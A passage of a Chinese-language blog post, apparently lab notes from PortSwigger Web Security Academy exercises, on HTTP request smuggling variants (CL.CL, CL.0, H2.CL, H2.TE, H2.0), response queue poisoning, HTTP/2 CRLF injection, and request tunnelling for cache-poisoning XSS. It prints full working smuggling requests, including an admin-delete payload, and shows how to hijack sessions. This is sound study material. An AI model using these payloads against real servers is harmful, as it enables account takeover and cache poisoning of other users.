class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a58000103add95680376cb9003a0008.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">accept: */*</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Storage-Access: active</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: session=Gji6kFE5GyJKj7XdXghfLDZ84GBKsdR4</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: xchunked</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure><h4 id="clcl的混淆方式"><a href="#clcl的混淆方式" class="headerlink" title="clcl的混淆方式"></a>clcl的混淆方式</h4><p>标头同时存在两个cl</p><p>前端服务器和后端服务器都使用<code>Content-Length</code>请求头，但是前后端服务器对多个<code>Content-Length</code>请求头的处理存在差异时，存在此漏洞。如用户发送以下请求：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span>\r\n</span><br><span class="line"><span class="title class_">Host</span>: example.<span class="property">com</span>\r\n</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">30</span>\r\n</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">5</span>\r\n</span><br><span class="line"></span><br><span class="line">a=<span class="number">1</span>\r\n</span><br><span class="line"><span class="variable constant_">GET</span> /admin <span class="variable constant_">HTTP</span>/<span class="number">1.1</span>\r\n</span><br><span class="line"><span class="attr">X</span>: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>前端服务器根据<code>Content-Length: 30</code>解析请求主体获取完整请求，但是后端服务器根据<code>Content-Length: 5</code>解析请求主体，将<code>a=1\r\n</code>后的部分当作下一个请求的开头，此时如果前端服务器继续向后端服务器转发请求，后端服务器收到的第二个请求为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /admin <span class="variable constant_">HTTP</span>/<span class="number">1.1</span>\r\n</span><br><span class="line"><span class="attr">X</span>: 1POST / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span>\r\n</span><br><span class="line"><span class="title class_">Host</span>: example.<span class="property">com</span>\r\n</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>成功执行了注入的HTTP请求，导致请求走私。</p><h4 id="cl-0类型并不需要混淆-本身就是一种被混淆过的"><a href="#cl-0类型并不需要混淆-本身就是一种被混淆过的" class="headerlink" title="cl.0类型并不需要混淆,本身就是一种被混淆过的"></a>cl.0类型并不需要混淆,本身就是一种被混淆过的</h4><p>cl.0直接用默认的就可以了</p><p>他是前端存在cl.但是后端的cl默认为0</p><p>又或者说后端cl被忽略了</p><p>所以他本身就是个存在前后端请求解析差异的漏洞类型</p><p>前端的cl正常让他update字节就行</p><p>然后写入想要污染的请求就行了</p><p>比如这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /resources/images/blog.svg HTTP/1.1</span><br><span class="line">Host: 0a6600af0319bf3080aa943600c700d0.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 34</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">GET /hopefully404 HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure><h4 id="H2-CL"><a href="#H2-CL" class="headerlink" title="H2.CL"></a>H2.CL</h4><p>根据文章里的讲解</p><p><strong>原因是</strong></p><p><strong>前端会自动把HTTP2进行自动降级发送给后端</strong></p><p><strong>返回包里的HTTP&#x2F;2 200 OK是前端的返回内容</strong></p><p><strong>如果发包请求改成HTTP&#x2F;1.1</strong></p><p><strong>这里就是HTTP&#x2F;1.1 200 OK</strong></p><p><strong>所以由此判断这里是前端响应的返回包</strong></p><p><strong>因为前端和后端之间是用HTTP&#x2F;1.1把HTTP&#x2F;2自动降级的</strong></p><p><strong>自动降级的时候如果没有检查请求包里的CL请求头或者验证删除</strong></p><p><strong>这个时候就会造成HTTP&#x2F;1.1的请求走私</strong></p><p><strong>原理跟其他的类型其实都有点像</strong></p><h5 id="重点-为什么这里在HTTP-2可以的情况下改成HTTP-1-1的时候就不行了"><a href="#重点-为什么这里在HTTP-2可以的情况下改成HTTP-1-1的时候就不行了" class="headerlink" title="重点:为什么这里在HTTP&#x2F;2可以的情况下改成HTTP&#x2F;1.1的时候就不行了"></a>重点:为什么这里在HTTP&#x2F;2可以的情况下改成HTTP&#x2F;1.1的时候就不行了</h5><p><strong>原因在于HTTP&#x2F;1.1的时候前端检测到的时候会对te和cl头进行检测和验证删除错误的</strong></p><p><strong>就不会请求走私</strong></p><p><strong>但是HTTP&#x2F;2本来是不支持te和cl的</strong></p><p><strong>但是前端服务器会把它进行降级发送给后端</strong></p><p><strong>然后前端服务器对HTTP&#x2F;2又没有检测验证te和cl头的话那么就可以请求走私</strong></p><p><strong>前端服务器在进行降级时会添加HTTP&#x2F;1请求头，如果降级之前没有验证或删除<code>Content-Length</code>，那我们就可以注入<code>Content-Length</code>头，造成请求走私。</strong></p><p><strong>注意:YAKIT不太行这里要用bp右边改成http2</strong></p><p><strong>而不是直接改发包的字符不然不可以</strong></p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250501221256670.png" alt="image-20250501221256670"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0ad600200454f10d8187110b00140041.web-security-academy.net</span><br><span class="line">Sec-Ch-Ua: &quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Dest: script</span><br><span class="line">Referer: https://0ad600200454f10d8187110b00140041.web-security-academy.net/post/comment/confirmation?postId=10</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Priority: u=1</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">GET /resources/labheader/images/ps-lab-notsolved.svg HTTP/1.1</span><br><span class="line">Host: 0ad600200454f10d8187110b00140041.web-security-academy.net</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure><h4 id="H2-TE"><a href="#H2-TE" class="headerlink" title="H2.TE:"></a>H2.TE:</h4><p>原理跟上一个差不多</p><p><strong>前端服务器遇到HTPP&#x2F;2的时候进行降级时会添加HTTP&#x2F;1请求头，如果降级之前没有验证或删除<code>Transfer-Encoding</code>，那我们就可以注入<code>Transfer-Encoding</code>头，造成请求走私。</strong></p><h5 id="重点-当我们在成功之后对HTTP-2改成HTTP-1-1发现不能请求走私的原因"><a href="#重点-当我们在成功之后对HTTP-2改成HTTP-1-1发现不能请求走私的原因" class="headerlink" title="重点:当我们在成功之后对HTTP&#x2F;2改成HTTP&#x2F;1.1发现不能请求走私的原因:"></a>重点:当我们在成功之后对HTTP&#x2F;2改成HTTP&#x2F;1.1发现不能请求走私的原因:</h5><p><strong>原因在于前端服务器对HTTP&#x2F;1.1的请求会进行te和cl的检测和验证</strong></p><p><strong>遇到HTTP&#x2F;2的时候不会并且对他们进行降级</strong></p><p><strong>所以才存在这个类型的漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a4a00ef04db2deb808e03950077005c.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: 0a4a00ef04db2deb808e03950077005c.web-security-academy.net</span><br><span class="line">Cookie: session=whF1fXAlIu4igEcgBjMxC2PgfCbVihoT</span><br><span class="line">Sec-Ch-Ua: &quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Referer: https://0a4a00ef04db2deb808e03950077005c.web-security-academy.net/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Priority: u=2, i</span><br></pre></td></tr></table></figure><h4 id="H2-0-漏洞"><a href="#H2-0-漏洞" class="headerlink" title="H2.0 漏洞:"></a>H2.0 漏洞:</h4><p>有点像CL.0</p><p>后端默认为0并且忽略了cl</p><p>所以前端如果接受到cl</p><p>那么这个时候就会出现请求走私</p><p>收到的所有cl都会成为下一个数据</p><p><strong>如果后端服务器忽略已降级请求的<code>Content-Length</code>请求头，则容易受到等效的“H2.0”漏洞的攻击。</strong></p><h3 id="使用场景利用点"><a href="#使用场景利用点" class="headerlink" title="使用场景利用点:"></a>使用场景利用点:</h3><p><strong>想要把受害者正常的请求回显出来要去找服务器端点有没有什么类似于公共留言版的地方才可以</strong></p><ol><li>存在回显或间接回显的端点<ul><li>目标服务器需存在能返回请求内容的功能（如留言板、搜索框、错误页面、日志接口等）。</li><li>例如：<code>/search?query=test</code> 返回包含<code>test</code>的页面。</li></ul></li><li>恶意请求能被后端处理并存储&#x2F;返回<ul><li>走私的第二个请求需触发服务端记录或显示数据（如写入数据库、生成错误日志等）。</li></ul></li></ol><p><strong>或者有没有什么可以外带的地方</strong></p><p><strong>如果要外带那么Host请求头可能会出现两个就会重复</strong></p><p><strong>这个时候就要用cl请求头去提前截止在第二个Host请求之前</strong></p><p><strong>然后构造的外带请求要自己写</strong></p><p><strong>注意:如果仅仅只是改host头服务器是不会把请求转发到外部的服务器的</strong></p><p><strong>除非服务器的有这样类似的逻辑才可以</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url = f&quot;http://&#123;request.headers[&#x27;Host&#x27;]&#125;/internal&quot; </span><br><span class="line">requests.get(url)   # 触发SSRF，向DNSLog发起请求 </span><br></pre></td></tr></table></figure><p>还可以通过我们自己构造的第二个请求里的cl长度去对一些不想要的内容或者协议头重复的地方前进行截止</p><p>这样也可以变成一个完整的请求</p><p><strong>注意:如果是POST请求则一定需要第二个构造的请求里存在CL</strong></p><p><strong>不然会不能被当作一个正常的请求</strong></p><h5 id="除了上面使用到的对一个请求的提前截止的一些方法我们还可以在最后加两个-r-n让他变成一个完整的请求"><a href="#除了上面使用到的对一个请求的提前截止的一些方法我们还可以在最后加两个-r-n让他变成一个完整的请求" class="headerlink" title="除了上面使用到的对一个请求的提前截止的一些方法我们还可以在最后加两个\r\n让他变成一个完整的请求"></a>除了上面使用到的对一个请求的提前截止的一些方法我们还可以在最后加两个\r\n让他变成一个完整的请求</h5><h3 id="使用场景-响应投毒"><a href="#使用场景-响应投毒" class="headerlink" title="使用场景:响应投毒"></a>使用场景:响应投毒</h3><h4 id="概念-缓存投毒和缓存欺骗"><a href="#概念-缓存投毒和缓存欺骗" class="headerlink" title="概念:缓存投毒和缓存欺骗:"></a>概念:缓存投毒和缓存欺骗:</h4><p><strong>前端服务器会缓存后端服务器资源可能会导致缓存欺骗和缓存投毒漏洞的存在</strong></p><p><strong>缓存投毒的原理是:让一个正常的静态文件变成一个恶意的js或者其他形式的代码或者文件</strong></p><p><strong>攻击者让用户和前端服务器都认为访问的是正常目录&#x2F;home但是由于后端的请求走私实际返回的内容是一个恶意的&#x2F;js&#x2F;hacker.js的内容.当他们两个之间多次被人访问的时候存在缓存.也就导致缓存投毒.</strong></p><p><strong>缓存欺骗的原理是:通过把目标用户存储关键信息api等等路径如my-account的响应内容缓存到一个静态路径是&#x2F;js&#x2F;test.js的请求路径</strong></p><p><strong>这个时候攻击者就可以访问获取&#x2F;js&#x2F;test.js获取api等等</strong></p><p><strong>用户虽然访问了&#x2F;js&#x2F;test.js前端服务器也认为是&#x2F;js&#x2F;test.js但是由于请求走私的构造实际返回的内容是&#x2F;my-account这个时候也就形成了缓存.别人也就可以获取</strong></p><p><strong>投毒和欺骗的区别在于:</strong></p><p><strong>投毒是让用户加载恶意的代码然后攻击者这里被动的拿到关键信息什么的通过加载恶意的js.适用于获取cookie什么的.但是api不存储在浏览器里获取不到</strong></p><p><strong>如果需要获取某个路径下的数据则需要使用欺骗</strong></p><p><strong>欺骗是让用户的关键信息路径的内容和一个静态的公共文件路径形成缓存.这个时候攻击者再去获取静态文件拿到关键信息内容比如api等等</strong></p><h4 id="靶场案例"><a href="#靶场案例" class="headerlink" title="靶场案例:"></a>靶场案例:</h4><p>在最后加两个\r\n让他变成完整的请求之后</p><p>那么目标用户这个时候访问请求得到的响应就是第二个请求的响应.</p><p>那么我们该如何拿到用户的响应呢?</p><p>这个时候就用到了爆破.不断地爆破拿到用户的请求响应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0acf00e5030b839e800303b2006a00ad.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">x=y</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 0acf00e5030b839e800303b2006a00ad.web-security-academy.net</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面最后空两行是因为有两个换行符\r\n</p><p>不断的爆破</p><p>我们就有机会拿到目标用户的响应</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 302 Found</span><br><span class="line">Location: /my-account?id=administrator</span><br><span class="line">Set-Cookie: session=2VbUAqb6BgRlEttMXZyJs3IgpWFTbDNq; Secure; HttpOnly; SameSite=None</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>靶场是这个<a href="https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling">https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling</a></p><p>原理图:</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508135322510.png" alt="image-20250508135322510"></p><h3 id="HTTP2下关于绕过CL和te的检测手法"><a href="#HTTP2下关于绕过CL和te的检测手法" class="headerlink" title="HTTP2下关于绕过CL和te的检测手法:"></a>HTTP2下关于绕过CL和te的检测手法:</h3><p><a href="https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection">HTTP&#x2F;2 request smuggling via CRLF injection</a></p><p>适用场景:HTTP&#x2F;2的降级情况下.才可以</p><p>通过右边的修改添加\r\n进行添加一个换行符绕过</p><p>这跟普通的换行符绕过是不同的</p><p>先看普通的换行符绕过包未绕过成功的情况下是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a6200e5042f0a2b8041037b00eb002a.web-security-academy.net</span><br><span class="line">Sec-Ch-Ua: &quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 562</span><br><span class="line">A: 1</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">x=y</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Host: 0a6200e5042f0a2b8041037b00eb002a.web-security-academy.net</span><br><span class="line">Cookie: session=A1r6UhopMritJ5QtfovkP8Iw5cx18EYe; _lab_analytics=YEZxczifpZQIdEmMILZlgRbva46pzRVgRcg9ugRyYYeere5qvA1T3kzbuvPygp6mJY0DwY5U2ZSMmLngNOvAFecybcFm6AohFn3gKmP0hKrcjNglmBnwoU7IfdYs2368oevsAqK8CF5jLJ4lhqm49yZGBhzM8kuOCbhYIuzHerAOsxQv8iWgcKlSKhO13WzPDQQpypfEhTVQD2x4w9lpUoucIMa8lqZxZb9pu3SLNbuPKo7rP8OJ13EOWB0RNdhm</span><br><span class="line">Content-Length: 1200</span><br><span class="line"></span><br><span class="line">csrf=hmUSrLLt37piaQCHMjtHLpSP9FaeVKld&amp;postId=9&amp;name=12312&amp;email=123@qq.com&amp;website=http://123.com&amp;comment=ff</span><br></pre></td></tr></table></figure><p>这样的包是不会出现请求走私</p><p>我们需要做的是</p><p>在右边HTTP&#x2F;2的伪头部里进行换行符的写入</p><p>仔细观察HTTP&#x2F;1和HTTP&#x2F;2的情况下右边的header是不一样的写法.</p><p>HTTP&#x2F;2的是伪头部</p><p><strong>示例：</strong> 一个 HTTP&#x2F;2 请求可能包含如下伪头部：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:method: GET</span><br><span class="line">:path: /index.html</span><br><span class="line">:authority: www.example.com</span><br><span class="line">:scheme: https</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508155908041.png" alt="image-20250508155908041"></p><p>把Transfer-Encoding: chunked添加到右边的value里并且换行</p><p>这个时候再去点击一次apply changes</p><p>然后就会变成这样</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508160001665.png" alt="image-20250508160001665"></p><p>这个时候绕过也就成功了</p><p>我们尝试找个地方能让他回显出下一次请求的内容</p><p>有评论区或者搜索这个靶场里都可以做到</p><p>我这里用的是评论区</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508160110008.png" alt="image-20250508160110008"></p><p>把这个session拿到然后修改浏览器的session就可以了</p><h2 id="http2里的请求隧道攻击–请求走私的变种"><a href="#http2里的请求隧道攻击–请求走私的变种" class="headerlink" title="http2里的请求隧道攻击–请求走私的变种:"></a>http2里的请求隧道攻击–请求走私的变种:</h2><p><strong>如果前端和后端对我们这个请求不会搭建隧道也就是不复用tcp连接</strong><br><strong>我们可以把两个请求赛到一个请求里?这样也就可以看成是一个隧道?</strong></p><p><strong>只需要在HTTP2伪标头里CRLF换行注入就可以实现请求隧道攻击</strong></p><ul><li>即使前端和后端不复用连接（即不共享TCP连接处理多用户请求），攻击者仍可通过构造<strong>单连接内的歧义请求</strong>，让后端解析出多个请求（走私）。</li><li><strong>这本质上是请求走私的一种实现</strong>，而非严格意义的“隧道复用”，但效果类似（绕过前端检查，向后端注入请求）。</li></ul><h2 id="请求隧道的crlf注入漏洞的原理图"><a href="#请求隧道的crlf注入漏洞的原理图" class="headerlink" title="请求隧道的crlf注入漏洞的原理图:"></a>请求隧道的crlf注入漏洞的原理图:</h2><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508210757019.png" alt="image-20250508210757019"></p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508213120999.png" alt="image-20250508213120999"></p><p>根据图片我们可以知道第二个请求走私的响应内容客户端是收不到的?</p><p>但是我们可以通过改成HEAD头去看反应</p><p>出现两个HTTP&#x2F;1.1或者类似的两个Server Error都是代表着请求走私成功的意思</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 500 Internal Server Error</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 150</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Server Error: Proxy error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Server Error: Received only 516 of expected 3247 bytes of data&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>补充:这里的环境是前端拿到的第一个请求包的显示的长度</p><p>然后返回的内容是第二个请求包的内容</p><p>所以当长度和内容不匹配的时候会出现</p><p>Server Error: Received only 516 of expected 3247 bytes of data</p><h2 id="请求隧道走私缓存投毒笔记和当前比较有阶段性的总结"><a href="#请求隧道走私缓存投毒笔记和当前比较有阶段性的总结" class="headerlink" title="请求隧道走私缓存投毒笔记和当前比较有阶段性的总结:"></a>请求隧道走私缓存投毒笔记和当前比较有阶段性的总结:</h2><p><strong>请求隧道走私</strong></p><p><strong>就是通过伪标头crlf换行注入</strong></p><p><strong>实现绕过的前端</strong></p><p><strong>前端在降级HTTP&#x2F;2请求的时候会重写</strong></p><p><strong>这个时候识别到里面的CRLF然后就变成正常的换行请求进行写入</strong></p><p><strong>这个时候也就绕过了前端的检验</strong></p><p><strong>重写为http&#x2F;1.1的请求之后</strong></p><p><strong>一般一个就会变成两个请求</strong></p><p><strong>如果第一个请求是get那么返回的内容也是get.里面夹杂的第二个请求就算返回到前端.也最终不会显示到用户浏览器这里</strong></p><p><strong>原因是用户只发送了一个请求.前端服务器收到了两个来自后端服务器的响应.那么最终也只能返回一个响应包给用户</strong></p><p><strong>并且由于响应包里Content-Length的存在.导致第二个响应不能和第一个相应整合在一起</strong></p><p><strong>如何去实现让第二个响应的内容回显到用户这里或者说拼接到第一个响应的内容里呢</strong></p><p><strong>这个时候就用到了HEAD请求</strong></p><p><strong>他会返回响应头的内容</strong></p><p><strong>但是不会返回响应的具体数据.但是又由于响应头里存在Content-Length: 8401这个头</strong></p><p><strong>那么这个时候我们就可以把第二个响应包的数据放入形成一个新的响应</strong></p><p><strong>这个时候我们把第一个请求包的头改成HEAD</strong></p><p><strong>第二个请求是get情况下</strong></p><p><strong>我们最终得到的内容是</strong></p><p><strong>第一个响应的响应头和第二个响应的数据包内容</strong></p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250516001640887.png" alt="image-20250516001640887"></p><p><strong>我们现在知道了可以把响应包内容控制到第一个响应包里面</strong></p><p><strong>那么如何让响应包的内容变成我们想要的呢</strong></p><p><strong>只需要找到一个目录接口</strong></p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250516001804890.png" alt="image-20250516001804890"></p><p><strong>如图</strong></p><p><strong>当我们尝试给这个目录的接口写入一点东西的时候由于是一个文件夹的目录.他会帮我们把这个路径302跳转到文件夹的子路径里然后加上后面的值</strong></p><p><strong>那么这个时候test部分就是我们可以自由控制和编写</strong></p><p><strong>写点html标签和script就可以实现xss攻击</strong></p><p><strong>再回到我们的请求走私包的构造</strong></p><p><strong>当我们尝试去构造一个xss的payload之后我们可以发现</strong></p><p><strong>响应的时候会出现一个等待响应还是响应等待时间过长的报错回显(没有图忘记截图和懒得重启靶场了)</strong></p><p><strong>原因是当我们的响应头是Content-Length: 8401</strong></p><p><strong>那么意味着响应的内容应该是8401个字节的值</strong></p><p><strong>如果只写了个xss.那么不满足响应头这个数值的值</strong></p><p><strong>所以会让前端服务器以为还有后续的内容没有发送过来</strong></p><p><strong>然后一直等待响应</strong></p><p><strong>然后响应超时</strong></p><p><strong>这个时候我们需要做的是写入大量的字符让我们这个响应包的内容满足长度.甚至超出长度也没关系那样前端服务器会自动截取</strong></p><p><strong>但不要超过太多超过太多可能就到达前端服务器的处理上限也就报错了</strong></p><p><strong>这就是我们第一张图出现很多test的原因</strong></p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250516002611696.png" alt="image-20250516002611696"></p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250516002630605.png" alt="image-20250516002630605"></p><p><strong>最后的最后就是这个靶场里的缓存漏洞实现原理很简单</strong></p><p><strong>我们频繁的在bp里发送这个恶意的包</strong></p><p><strong>然后就会形成缓存.别人访问&#x2F;路径的时候也就会出现我们写好的xss</strong></p><p><strong>然后造成危害</strong></p><p><strong>这个缓存是比较短暂的</strong></p><p><strong>可能十几秒或者一分钟缓存就会消失</strong></p><p><strong>这个时候你浏览器访问什么就是什么原来的内容</strong></p><p><strong>所以是缓存</strong></p><p><strong>所以需要利用的话要频繁发包</strong></p><h2 id="客户端不同步"><a href="#客户端不同步" class="headerlink" title="客户端不同步"></a>客户端不同步</h2><p>客户端不同步同步 (Client-Side Desync) 